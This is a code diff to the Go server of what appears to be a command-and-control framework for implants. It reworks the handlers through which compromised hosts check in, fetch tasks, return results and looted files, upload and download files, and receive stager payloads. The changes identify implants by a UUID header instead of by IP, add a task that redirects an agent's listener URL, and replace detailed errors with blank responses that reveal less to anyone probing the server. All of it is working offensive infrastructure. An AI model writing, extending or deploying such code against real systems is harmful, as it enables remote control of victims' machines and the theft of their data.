@@ -44,6 +44,15 @@ type StagerData struct {
 	LoaderType string `json:"loaderType"`
 }
 
+// This function is used for verifying the connected agent.
+func verifyAgentCheckIn(ag *agent.Agent, ip string, os string, arch string, hostname string) bool {
+	if ag.Ip == ip && ag.OS == os && ag.Arch == arch && ag.Hostname == hostname {
+		return true
+	} else {
+		return false
+	}
+}
+
 func handleImplantCheckIn(lis *listener.Listener, database *db.Database) gin.HandlerFunc {
 	fn := func(ctx *gin.Context) {
 		clientIP := ctx.ClientIP()
@@ -51,12 +60,12 @@ func handleImplantCheckIn(lis *listener.Listener, database *db.Database) gin.Han
 		// Read JSON data
 		jsonBytes, err := ctx.GetRawData()
 		if err != nil {
-			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 		var checkInData CheckInData
 		if err := json.Unmarshal(jsonBytes, &checkInData); err != nil {
-			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 
@@ -66,13 +75,13 @@ func handleImplantCheckIn(lis *listener.Listener, database *db.Database) gin.Han
 		// Check if the agent already exists on the database.
 		ags, err := database.AgentGetAll()
 		if err != nil {
-			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 
 		var targetAgent *agent.Agent = nil
 		for _, ag := range ags {
-			if ag.Ip == clientIP && ag.OS == checkInData.OS && ag.Arch == checkInData.Arch {
+			if verifyAgentCheckIn(ag, clientIP, checkInData.OS, checkInData.Arch, checkInData.Hostname) {
 				targetAgent = ag
 				break
 			}
@@ -96,7 +105,7 @@ func handleImplantCheckIn(lis *listener.Listener, database *db.Database) gin.Han
 				checkInData.KillDate,
 			)
 			if err := database.AgentAdd(targetAgent); err != nil {
-				ctx.String(http.StatusBadGateway, fmt.Sprint(err))
+				ctx.String(http.StatusBadRequest, "")
 				return
 			}
 		} else {
@@ -104,7 +113,7 @@ func handleImplantCheckIn(lis *listener.Listener, database *db.Database) gin.Han
 			targetAgent.Hostname = checkInData.Hostname
 			targetAgent.CheckInDate = checkInDate
 			if err := database.AgentUpdate(targetAgent); err != nil {
-				ctx.String(http.StatusBadGateway, fmt.Sprint(err))
+				ctx.String(http.StatusBadRequest, "")
 				return
 			}
 		}
@@ -112,40 +121,41 @@ func handleImplantCheckIn(lis *listener.Listener, database *db.Database) gin.Han
 		// Make the agent directory and others
 		err = metafs.MakeAgentChildDirs(targetAgent.Name, false)
 		if err != nil {
-			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 
-		ctx.String(http.StatusOK, "Checkin")
+		ctx.String(http.StatusOK, targetAgent.Uuid)
 	}
 	return gin.HandlerFunc(fn)
 }
 
 func handleImplantTaskGet(database *db.Database) gin.HandlerFunc {
 	fn := func(ctx *gin.Context) {
-		clientIP := ctx.ClientIP()
+		// Get the client UUID
+		clientUUID := ctx.GetHeader("X-UUID")
 
 		ags, err := database.AgentGetAll()
 		if err != nil {
-			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 		var targetAgent *agent.Agent = nil
 		for _, ag := range ags {
-			if ag.Ip == clientIP {
+			if ag.Uuid == clientUUID {
 				targetAgent = ag
 				break
 			}
 		}
 		if targetAgent == nil {
-			ctx.String(http.StatusBadGateway, "agent not found")
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 
 		// Get tasks
 		tasks, err := metafs.ReadAgentTasks(targetAgent.Name, false)
 		if err != nil {
-			ctx.String(http.StatusBadGateway, "tasks not set")
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 		if len(tasks) == 0 {
@@ -156,7 +166,7 @@ func handleImplantTaskGet(database *db.Database) gin.HandlerFunc {
 		task := tasks[0]
 		err = metafs.DeleteAgentTask(targetAgent.Name, task, false)
 		if err != nil {
-			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 
@@ -167,37 +177,44 @@ func handleImplantTaskGet(database *db.Database) gin.HandlerFunc {
 
 func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 	fn := func(ctx *gin.Context) {
-		clientIP := ctx.ClientIP()
+		// Get the client UUID
+		clientUUID := ctx.GetHeader("X-UUID")
 
-		// Get agent
 		ags, err := database.AgentGetAll()
 		if err != nil {
-			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 
 		var targetAgent *agent.Agent = nil
 		for _, ag := range ags {
-			if ag.Ip == clientIP {
+			if ag.Uuid == clientUUID {
 				targetAgent = ag
 				break
 			}
 		}
 		if targetAgent == nil {
-			ctx.String(http.StatusBadGateway, "agent not found")
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 
 		task := ctx.GetHeader("X-Task")
 
+		// Get the task result.
 		data, err := ctx.GetRawData()
 		if err != nil {
-			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 
 		content := ""
 		switch {
+		case strings.HasPrefix(task, "connect "):
+			// Update listener URL of the agent on the database.
+			targetAgent.ListenerURL = string(data)
+			database.AgentUpdate(targetAgent)
+
+			content = "Listener URL has been updated."
 		case strings.HasPrefix(task, "download "):
 			downloadPath := string(data)
 			content = fmt.Sprintf("Downloaded at %s", downloadPath)
@@ -205,7 +222,7 @@ func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 			// Write a dump file.
 			outFile, err := metafs.WriteAgentLootFile(targetAgent.Name, data, false, task)
 			if err != nil {
-				ctx.String(http.StatusBadGateway, fmt.Sprint(err))
+				ctx.String(http.StatusBadRequest, "")
 				return
 			}
 			content = fmt.Sprintf("Saved at %s", outFile)
@@ -213,14 +230,14 @@ func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 			sleepTimeStr := strings.Split(task, " ")[1]
 			sleepTime, err := strconv.ParseUint(sleepTimeStr, 10, 64)
 			if err != nil {
-				ctx.String(http.StatusBadGateway, fmt.Sprint(err))
+				ctx.String(http.StatusBadRequest, "")
 				return
 			}
 			// Update sleep time on the database
 			targetAgent.Sleep = uint(sleepTime)
 			err = database.AgentUpdate(targetAgent)
 			if err != nil {
-				ctx.String(http.StatusBadGateway, fmt.Sprint(err))
+				ctx.String(http.StatusBadRequest, "")
 				return
 			}
 			content = "The sleep time has been changed."
@@ -234,7 +251,7 @@ func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 		// Write the task result to a file.
 		_, err = metafs.WriteAgentLoot(targetAgent.Name, task, content, false)
 		if err != nil {
-			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 		ctx.String(http.StatusOK, "OK")
@@ -268,22 +285,24 @@ func handleImplantWebSocket(ctx *gin.Context) {
 
 func handleDownload(database *db.Database) gin.HandlerFunc {
 	fn := func(ctx *gin.Context) {
-		clientIP := ctx.ClientIP()
+		// Get the client UUID
+		clientUUID := ctx.GetHeader("X-UUID")
+
 		// Check if the agent exists on the database
 		ags, err := database.AgentGetAll()
 		if err != nil {
-			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 		agentExists := false
 		for _, ag := range ags {
-			if ag.Ip == clientIP {
+			if ag.Uuid == clientUUID {
 				agentExists = true
 				break
 			}
 		}
 		if !agentExists {
-			ctx.String(http.StatusBadGateway, "You're not an agent.")
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 
@@ -295,7 +314,7 @@ func handleDownload(database *db.Database) gin.HandlerFunc {
 		// Read the request data (file path to download)
 		filenameBytes, err := ctx.GetRawData()
 		if err != nil {
-			w.WriteHeader(http.StatusBadGateway)
+			w.WriteHeader(http.StatusBadRequest)
 			w.(http.Flusher).Flush()
 			return
 		}
@@ -304,7 +323,7 @@ func handleDownload(database *db.Database) gin.HandlerFunc {
 		// Prepare the file
 		data, err := os.ReadFile(filename)
 		if err != nil {
-			w.WriteHeader(http.StatusBadGateway)
+			w.WriteHeader(http.StatusBadRequest)
 			w.(http.Flusher).Flush()
 			return
 		}
@@ -323,23 +342,24 @@ func handleDownload(database *db.Database) gin.HandlerFunc {
 
 func handleUpload(database *db.Database) gin.HandlerFunc {
 	fn := func(ctx *gin.Context) {
-		clientIP := ctx.ClientIP()
+		// Get the client UUID
+		clientUUID := ctx.GetHeader("X-UUID")
 
 		// Get the agent
 		ags, err := database.AgentGetAll()
 		if err != nil {
-			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 		var targetAgent *agent.Agent = nil
 		for _, ag := range ags {
-			if ag.Ip == clientIP {
+			if ag.Uuid == clientUUID {
 				targetAgent = ag
 				break
 			}
 		}
 		if targetAgent == nil {
-			ctx.String(http.StatusBadGateway, "Agent not found.")
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 
@@ -347,21 +367,21 @@ func handleUpload(database *db.Database) gin.HandlerFunc {
 		downloadPath := ctx.GetHeader("X-File")
 		// Check if the file already exists
 		if _, err := os.Stat(downloadPath); err == nil {
-			ctx.String(http.StatusBadGateway, "file already exists.")
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 
 		// Read data from the file
 		data, err := ctx.GetRawData()
 		if err != nil {
-			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 
 		// Save the file
 		err = os.WriteFile(downloadPath, data, 0644)
 		if err != nil {
-			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 
@@ -380,19 +400,19 @@ func handleStagerDownload(lis *listener.Listener) gin.HandlerFunc {
 		// Read JSON data
 		jsonBytes, err := ctx.GetRawData()
 		if err != nil {
-			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 		var stgData StagerData
 		if err := json.Unmarshal(jsonBytes, &stgData); err != nil {
-			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
+			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 
 		// Get all payload paths generated under '~/.hermit/server/listeners/<listner>/payloads'.
 		payloadPaths, err := metafs.GetListenerPayloadPaths(lis.Name, false, false)
 		if err != nil {
-			w.WriteHeader(http.StatusBadGateway)
+			w.WriteHeader(http.StatusBadRequest)
 			w.(http.Flusher).Flush()
 			return
 		}
@@ -453,7 +473,7 @@ func handleStagerDownload(lis *listener.Listener) gin.HandlerFunc {
 		if targetPayloadPath == "" {
 			// TODO: If there are not target payloads, set default paylaod.
 			// ...
-			w.WriteHeader(http.StatusBadGateway)
+			w.WriteHeader(http.StatusBadRequest)
 			w.(http.Flusher).Flush()
 			return
 		}
@@ -461,7 +481,7 @@ func handleStagerDownload(lis *listener.Listener) gin.HandlerFunc {
 		// Read data from the payload.
 		data, err := os.ReadFile(targetPayloadPath)
 		if err != nil {
-			w.WriteHeader(http.StatusBadGateway)
+			w.WriteHeader(http.StatusBadRequest)
 			w.(http.Flusher).Flush()
 			return
 		}
